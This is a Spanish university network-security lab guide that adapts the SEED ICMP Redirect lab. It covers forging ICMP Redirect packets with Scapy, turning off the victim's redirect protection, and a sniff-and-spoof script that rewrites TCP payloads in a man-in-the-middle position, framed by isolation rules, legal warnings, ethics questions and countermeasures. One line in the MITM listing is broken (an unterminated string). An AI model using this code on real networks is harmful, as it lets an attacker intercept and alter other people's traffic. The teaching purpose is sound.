# P-07 · Ataque de Redirección ICMP

> Práctica del **Manual de Prácticas** de Seguridad en Redes · INGE-00107 · Universidad de Cuenca.  
> Documento generado desde el manual: no lo edite a mano (véase el [índice de prácticas](../practicas/README.md)).

> [!NOTE]
> El entorno de esta práctica todavía no está publicado en esta carpeta.

| Campo | Valor |
| --- | --- |
| **Asignatura** | Seguridad en Redes |
| **Docente** | Dr. Fabián Astudillo-Salinas |
| **Unidad** | 600 – Ataques al protocolo TCP |
| **Código** | INGE-00107 |
| **Modalidad** | Presencial |
| **Valoración** | 10 puntos |
| **Grupos** | Máx. 3 estudiantes |
| **Entrega** | Según calendario |
| **ABET** | SO4 – Responsabilidad Ética y Profesional (PI 4.1 y PI 4.2) — representa el 30 % de la valoración |

## Marco Teórico

Los fundamentos teóricos sintetizados en esta sección se basan en [1], [2]; se recomienda consultar dichas fuentes para una exposición más profunda. El procedimiento de laboratorio adapta el *ICMP Redirect Attack Lab* de SEED [2].

### El protocolo ICMP y los mensajes Redirect

Un mensaje **ICMP Redirect** es un mensaje de error que un router envía al *emisor* de un paquete IP cuando considera que dicho paquete se está enrutando de forma ineficiente, para indicarle que use otro router en los siguientes envíos a ese destino. El mensaje ICMP Redirect es de **tipo 5**; su campo *gateway* (`gw`) indica el nuevo router, y encapsula la cabecera del paquete IP original que disparó el redireccionamiento. Un atacante puede **falsificar** estos mensajes para alterar la *caché* de enrutamiento de la víctima y desviar su tráfico hacia un router malicioso, logrando un ataque **Man-in-the-Middle (MITM)**. Esta práctica cubre: el protocolo IP e ICMP, el ataque de redirección ICMP y el enrutamiento.

En el escenario, cuando la víctima (`10.9.0.5`) envía paquetes a `192.168.60.5`, el ataque logra que use el **router malicioso** (`10.9.0.111`) como gateway; al estar controlado por el atacante, este puede interceptar y modificar los paquetes.

**Objetivo general**
Lanzar un ataque de redirección ICMP para manipular la caché de enrutamiento de la víctima y, sobre esa base, ejecutar un ataque MITM que intercepte y modifique su tráfico.
**Objetivos específicos**

- **OE1.** Construir mensajes ICMP Redirect falsificados con Scapy y desviar el tráfico de la víctima hacia el router malicioso.
- **OE2.** Verificar el cambio en la caché de enrutamiento y analizar las condiciones de éxito del ataque (gateway remoto, inexistente, `send_redirects`).
- **OE3.** Convertir el router malicioso en un MITM (deshabilitar el reenvío IP y usar *sniff-and-spoof*) para modificar los paquetes.

## Actividades previas

Antes de la sesión de laboratorio, cada estudiante debe completar las siguientes actividades preparatorias:

- **AP1.** Leer el marco teórico de esta práctica y las referencias citadas para resolver dudas conceptuales antes de ingresar al laboratorio.
- **AP2.** Verificar que el entorno virtual (VMs SEED/Kali y red NAT) esté operativo conforme al capítulo *Configuración del Entorno: SEED VM en VirtualBox*.
- **AP3.** Tomar una *snapshot* del estado inicial de cada VM involucrada en la práctica para poder revertir cambios.
- **AP4.** Revisar la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio).
- **AP5.** Preparar la bitácora digital (plantilla provista o documento propio) para registrar comandos, capturas y observaciones durante la sesión.

## Materiales y Equipos

| Recurso | Descripción |
| --- | --- |
| SEED Ubuntu 20.04 VM | Entorno de laboratorio SEED |
| Docker + Docker Compose | Víctima, atacante, router malicioso y destinos |
| Python 3 + Scapy | Construcción de paquetes ICMP Redirect y MITM |
| netcat (`nc`) + Wireshark | Tráfico de prueba y captura/análisis |

> [!NOTE]
> **Provisión de materiales**
>
> El estudiante adquiere o instala por su cuenta el equipo personal (laptop), las máquinas virtuales (VirtualBox, SEED VM, Kali Linux, contenedores Docker) y todo el software listado arriba. El laboratorio de la Carrera de Telecomunicaciones provee el espacio físico, el mobiliario y **acceso a Internet supervisado** para la descarga de imágenes, paquetes y consulta de documentación durante la sesión. El laboratorio no entrega equipos de cómputo personales ni licencias de software.

## Entorno de Laboratorio

> **Figura 1.** Topología del laboratorio P-07 (*Lab environment setup*): víctima, atacante y router malicioso en la LAN `10.9.0.0/24`, y red interna `192.168.60.0/24` tras el router legítimo (adaptado de la Fig. 1 del SEED ICMP Redirect Attack Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

Levante la topología con `docker-compose` (alias `dcbuild`, `dcup`, `dockps`, `docksh`). El contenedor atacante (y el router malicioso) usan `privileged: true` para poder modificar parámetros del kernel con `sysctl` (p. ej. el reenvío IP). La contramedida de la víctima viene **desactivada** en `docker-compose.yml` para permitir el ataque:

**Listado 1.** Aceptación de ICMP Redirect en la víctima

```bash
# En docker-compose.yml (víctima):
sysctls:
    - net.ipv4.conf.all.accept_redirects=1
# Para activar la protección: poner el valor en 0
# sysctl net.ipv4.conf.all.accept_redirects=0
```

## Consideraciones de seguridad

Antes de iniciar el procedimiento, revise la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio). Para esta práctica se destacan los siguientes riesgos y precauciones específicas:

- **Aislamiento de red obligatorio**: las herramientas ofensivas y los tráficos manipulados deben permanecer dentro de las VMs y la red NAT del laboratorio. Está prohibido ejecutar comandos de esta práctica contra la red institucional, redes públicas o equipos de terceros.
- **Snapshots y reversibilidad**: tome una instantánea antes de ejecutar comandos potencialmente destructivos (modificación de `iptables`, tablas ARP/ruteo, `/etc/hosts`, `rc.local`, claves, certificados, etc.).
- **Marco legal**: el uso de las herramientas fuera del entorno autorizado puede tipificarse como delito informático (COIP Arts. 229 y 234; Ley Orgánica de Protección de Datos Personales). Véase el warningbox de la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio).
- **Riesgos eléctricos y ergonomía**: aplique las pausas activas y las verificaciones eléctricas de las Secciones *Riesgos eléctricos* y *Ergonomía* dentro de Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Art. 37 y Art. 38 del Reglamento UC-CU-REG-006-2024).

> [!WARNING]
> **Riesgos específicos de la práctica**
>
> Antes de avanzar, el estudiante debe identificar y discutir con el docente cualquier riesgo adicional propio de esta práctica (por ejemplo: pérdida de conectividad de la VM atacante, denegación de servicio inducida sobre el host, generación accidental de tráfico ruidoso que sature la red NAT). Documente estos riesgos y las medidas de mitigación en la bitácora.

## Procedimiento

### Tarea 1 — Lanzar el ataque de redirección ICMP

La víctima usa el router legítimo (`192.168.60.11`, vía `10.9.0.11`) para alcanzar la red `192.168.60.0/24`. Verifique su tabla de rutas inicial:

**Listado 2.** Tabla de rutas inicial de la víctima

```bash
# ip route
default via 10.9.0.1 dev eth0
10.9.0.0/24 dev eth0 proto kernel scope link src 10.9.0.5
192.168.60.0/24 via 10.9.0.11 dev eth0
```

Desde el atacante, falsifique un ICMP Redirect que aparente venir del router legítimo e indique al router malicioso (`10.9.0.111`) como nuevo gateway. El paquete IP encapsulado (`ip2`) debe ser el que ``dispararía'' el redireccionamiento (complete los `@@@@`):

**Listado 3.** Ataque ICMP Redirect con Scapy (esqueleto)

```python
#!/usr/bin/env python3
from scapy.all import *

ip   = IP(src = @@@@, dst = @@@@)          # src: router legítimo; dst: víctima
icmp = ICMP(type=@@@@, code=@@@@)          # type=5 (redirect), code=1 (host)
icmp.gw = @@@@                             # nuevo gateway: router malicioso

# El paquete IP encapsulado debe ser el que dispara el redirect
ip2 = IP(src = @@@@, dst = @@@@)           # src: víctima; dst: destino
send(ip/icmp/ip2/ICMP());
```

#### Verificación

El ICMP Redirect no modifica la tabla de rutas, sino la **caché** de enrutamiento (las entradas vencen tras un tiempo). Inspecciónela y haga un *traceroute* para comprobar el desvío:

**Listado 4.** Caché de rutas y traceroute

```bash
# ip route show cache
192.168.60.5 via 10.9.0.111 dev eth0
    cache <redirected> expires 296sec
# ip route flush cache        # limpiar la caché
# mtr -n 192.168.60.5         # verificar el reenvío
```

> [!NOTE]
> **Nota: verificación de cordura del kernel**
>
> Si se falsifican redirects pero la víctima no ha enviado paquetes durante el ataque, este no funcionará: el kernel verifica que el `ip2` del redirect coincida con el tipo y la IP destino del paquete original que lo disparó. En Ubuntu 22.04 la verificación es más estricta; lo más sencillo es husmear un paquete real de la víctima para construir un `ip2` válido.

#### Experimentos (preguntas guía)

Tras lograr el ataque, repítalo bajo estas condiciones y explique lo observado:

- **Q1.** ¿Puede redirigir a una máquina **remota** (un `icmp.gw` fuera de la LAN local)?
- **Q2.** ¿Puede redirigir a una máquina **inexistente** en la misma red (un `icmp.gw` apagado o que no existe)?
- **Q3.** En `docker-compose.yml` del router malicioso están `net.ipv4.conf.all.send_redirects=0` (y `default`/ `eth0`). ¿Cuál es su propósito? Cámbielos a `1`, relance el ataque y explique el resultado.

### Tarea 2 — Ataque Man-In-The-Middle (MITM)

Con el redireccionamiento, todo el tráfico de la víctima a `192.168.60.5` pasa por el router malicioso (`10.9.0.111`). Ahora se interceptará y modificará. Primero, levante un cliente/servidor TCP con `netcat`:

**Listado 5.** Cliente y servidor netcat

```bash
// En el destino 192.168.60.5: iniciar el servidor
# nc -lp 9090
// En la víctima: conectarse al servidor
# nc 192.168.60.5 9090
```

Cada línea que la víctima escribe viaja en un paquete TCP hacia el destino. La tarea consiste en **reemplazar** cada aparición de su *nombre* por una secuencia de letras ``A'' de la **misma longitud** (para no alterar el número de secuencia TCP y no romper la conexión). Use su nombre real para evidenciar la autoría.

**Deshabilitar el reenvío IP.** Como el router malicioso va a *reemplazar* los paquetes (no reenviarlos), hay que desactivar su reenvío IP; así el kernel descarta el paquete original y el programa de *sniff-and-spoof* se encarga de reenviar la versión modificada:

**Listado 6.** Deshabilitar el reenvío IP en el router malicioso

```bash
# sysctl net.ipv4.ip_forward=0
```

**Código MITM (sniff-and-spoof).** El programa captura los paquetes TCP, modifica el contenido y los reenvía. Recuerde ajustar el filtro para **no** capturar los paquetes que el propio programa genera:

**Listado 7.** MITM con sniff-and-spoof (mitm_sample.py)

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** 
        # Reemplazar un patrón (misma longitud)
        newdata = data.replace(b'seedlabs', b'AAAAAAAA')
        send(newpkt/newdata)
    else:
        send(newpkt)

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

Tras lograr el MITM, responda: (Q4) ¿en qué dirección basta con capturar el tráfico y por qué? (Q5) al filtrar el tráfico de la víctima, ¿conviene usar su dirección IP o su MAC?; pruebe ambas y justifique cuál es la correcta.

## Recolección y análisis de datos

Durante la ejecución del procedimiento, registre en su bitácora los datos solicitados a continuación. Las tablas siguientes (o equivalentes en su informe) forman parte del entregable, conforme a la Sección [Directrices generales para el informe técnico](../practicas/00-normas-generales.md#directrices-generales-para-el-informe-técnico) (Directrices generales para el informe técnico).

**Tabla 1.** Bitácora de comandos y observaciones

| # | Comando / Acción | Salida u observación relevante |
| --- | --- | --- |
| 1 |   |   |
| 2 |   |   |
| 3 |   |   |
| 4 |   |   |
| 5 |   |   |

**Tabla 2.** Resultados clave / métricas obtenidas

| Métrica o evidencia | Valor | Comentario / unidad |
| --- | --- | --- |
|   |   |   |
|   |   |   |
|   |   |   |

**Pautas para el análisis de los datos recolectados:**

- Contraste los resultados observados con el comportamiento esperado según el marco teórico; explique las diferencias.
- Identifique anomalías o resultados inesperados y proponga una hipótesis explicativa basada en la teoría de la práctica.
- Cuando aplique, calcule métricas cuantitativas (latencias, tasas de éxito del ataque, paquetes inyectados, cobertura del escaneo, número de credenciales descubiertas, etc.) y preséntelas en gráficos o tablas adicionales en el informe.

## Preguntas de Análisis

- **P1.** ¿Qué campo del mensaje ICMP Redirect indica el nuevo gateway y qué tipo/código de ICMP corresponde a un redirect de host?
- **P2.** ¿Qué información contiene el paquete IP encapsulado (`ip2`) y por qué el kernel lo verifica antes de aceptar el redirect?
- **P3.** Responda los experimentos de la Tarea 1: ¿se puede redirigir a un gateway **remoto** o **inexistente**? ¿Qué efecto tiene `send_redirects`?
- **P4.** ¿Por qué en la Tarea 2 fue necesario desactivar el reenvío IP del router malicioso para realizar el MITM?
- **P5.** En el MITM, ¿por qué hay que reemplazar el nombre por una cadena de la **misma longitud**? ¿Qué pasaría si cambiara la longitud?
- **P6.** Compare el ataque ICMP Redirect con el envenenamiento ARP (P-06): similitudes, diferencias y contramedidas (¿por qué los SO modernos ignoran los redirects por defecto?).

## Actividad ABET — SO4: Responsabilidad Ética y Profesional

Esta actividad mide el **Student Outcome 4 (SO4)** de la Carrera de Telecomunicaciones requerido para la acreditación ABET: *habilidad para reconocer las responsabilidades éticas y profesionales en situaciones de ingeniería y emitir juicios fundamentados, considerando el impacto global, económico, medioambiental y social de las soluciones propuestas.* Representa el **30 %** de la valoración total de la práctica y evalúa los indicadores PI 4.1 y PI 4.2 mediante las preguntas SO4-1 y SO4-2.

- **SO4-1.** **[PI 4.1 — 15 %] Ética y responsabilidad profesional ante un ataque ICMP Redirect sobre infraestructura crítica**
  Un administrador de red descubre que routers de la infraestructura de una empresa de servicios públicos están siendo manipulados mediante mensajes ICMP Redirect falsos, redirigiendo el tráfico de control SCADA a través de un nodo malicioso. Analice:

  - **a)** Las **responsabilidades éticas** del ingeniero al gestionar este incidente: contención inmediata, preservación de evidencias y notificación.
  - **b)** Las **consideraciones éticas específicas** cuando la infraestructura afectada es crítica (servicios de agua, electricidad): el deber de priorizar la seguridad pública.
  - **c)** El **marco legal ecuatoriano** (COIP Arts. 229 y 234; Ley de Seguridad Pública) aplicable a ataques sobre infraestructura crítica.
- **SO4-2.** **[PI 4.2 — 15 %] Impacto económico, social y ambiental de un ataque de redirección ICMP masivo**
  Un ataque de redirección ICMP sobre la red de un ISP ecuatoriano de tamaño medio afecta a 200 000 usuarios, redirigiendo su tráfico a través de un nodo controlado por el atacante durante 8 horas. Analice de manera integral las siguientes dimensiones:

  - **a)** **Económico:** pérdidas del ISP (clientes que abandonan el servicio, penalizaciones de SLA, costos forenses), pérdidas de usuarios (datos robados, sesiones comprometidas).
  - **b)** **Social:** exposición masiva de comunicaciones privadas, afectación de servicios esenciales (telemedicina, educación en línea) y erosión de la confianza en el ISP.
  - **c)** **Ambiental:** consumo energético del nodo de interceptación y de la respuesta al incidente.
  - **d)** **Contramedidas:** dos técnicas (deshabilitar ICMP Redirect, BCP38/uRPF) y una política organizacional, citando RFC 5358, RFC 2827 o NIST SP 800-81r2.

## Discusión y conclusiones

A partir de los datos recolectados y del análisis realizado, elabore una discusión que responda al menos a las siguientes preguntas guía:

- **DC1.** ¿Se alcanzaron los objetivos planteados? Justifique cada uno con evidencia experimental concreta (capturas, métricas, salidas de comandos).
- **DC2.** ¿Qué limitaciones impone el entorno virtualizado a los resultados? ¿Cómo se trasladarían las observaciones a un escenario real de producción?
- **DC3.** ¿Qué contramedidas o controles de seguridad mitigan el ataque o refuerzan la defensa estudiada? Cite al menos una buena práctica de la industria, una RFC o un estándar (ISO/IEC, IEEE, NIST) pertinente.
- **DC4.** ¿Qué errores se cometieron durante la práctica y qué recomendaciones daría a futuros estudiantes para evitarlos?

Cierre con **conclusiones** (3–5 viñetas) que resuman los hallazgos principales y los vinculen explícitamente con los *Resultados de Aprendizaje* de la asignatura.

## Entregables

1. **Informe técnico** detallado con capturas que describan lo realizado y observado en cada tarea: la caché de rutas antes y después del redirect, el *traceroute* desviado, los experimentos Q1–Q3 y la evidencia del MITM (nombre reemplazado por ``A''). Incluya capturas Wireshark y explique cada fragmento de código (adjuntar sin explicar no recibe puntaje). Bibliografía IEEE (≥3 fuentes).
2. **Código fuente** comentado del ataque ICMP Redirect y del programa MITM (`mitm_sample.py`).
3. **Respuestas a la Actividad ABET – SO4** (preguntas SO4-1 y SO4-2), integradas en el informe técnico con extensión de 1–2 páginas por pregunta y las fuentes citadas según norma IEEE.

## Rúbrica de Evaluación

**Tabla 3.** Rúbrica — P-07 (10 puntos)

| Criterio | Peso | Indicador | Descripción |
| --- | --- | --- | --- |
| Ataque ICMP Redirect | 21 % | Caché redirigida | Redirect falsificado válido; la caché de la víctima apunta al router malicioso (`ip route show cache`). |
| Experimentos (Q1–Q3) | 14 % | Condiciones de éxito | Casos gateway remoto/inexistente y `send_redirects` documentados y explicados. |
| Ataque MITM | 21 % | Paquete modificado | Reenvío IP desactivado; el nombre se reemplaza por ``A'' sin romper la conexión TCP. |
| Análisis | 14 % | Preguntas respondidas | Respuestas con fundamento técnico (incl. Q4 y Q5). |
| **ABET – SO4: Responsabilidad Ética y Profesional (30 %)** |   |   |   |
| PI 4.1 – Ética profesional | 15 % | Respuesta ética fundamentada | Aplica principios éticos y legales al escenario del incidente; la cadena de notificación está justificada. |
| PI 4.2 – Impacto integral | 15 % | Análisis de impacto | Evalúa impacto económico, social y ambiental con contramedidas técnicas y organizacionales, citando al menos un estándar internacional. |

**Tabla 4.** Escala ABET SO4 — P-07

| PI | No cumple<br>(0–59 %) | Cumple parcialmente<br>(60–69 %) | Cumple<br>(70–79 %) | Supera<br>(80–89 %) | Supera ampliamente<br>(90–100 %) |
| --- | --- | --- | --- | --- | --- |
| 4.1 | No aplica principios éticos ni profesionales al evaluar la situación de incidente. | Aplica de manera inconsistente los principios éticos; el análisis legal es superficial o erróneo. | Aplica de manera básica los principios éticos; menciona el marco legal ecuatoriano sin análisis profundo. | Aplica coherentemente su juicio ético y profesional; integra el COIP y la LOPDP con argumentación clara. | Aplica de manera ejemplar e integral su juicio ético; argumenta cada decisión con evidencia y normativas citadas con precisión. |
| 4.2 | No considera ninguno de los tres impactos (económico, social, ambiental). | Considera parcialmente uno o dos de los impactos; las contramedidas no citan estándares. | Considera los tres impactos de forma adecuada; propone contramedidas pertinentes con al menos un estándar citado. | Integra los tres impactos con análisis detallado y contramedidas bien fundamentadas en estándares internacionales. | Realiza una evaluación exhaustiva de los tres impactos; las contramedidas son innovadoras y se respaldan en múltiples estándares. |

## Referencias

1. Postel, Jon, «Internet Control Message Protocol». RFC 792, 1981.
2. Du, Wenliang, «Computer & Internet Security: A Hands-on Approach». Independently published, 2019.
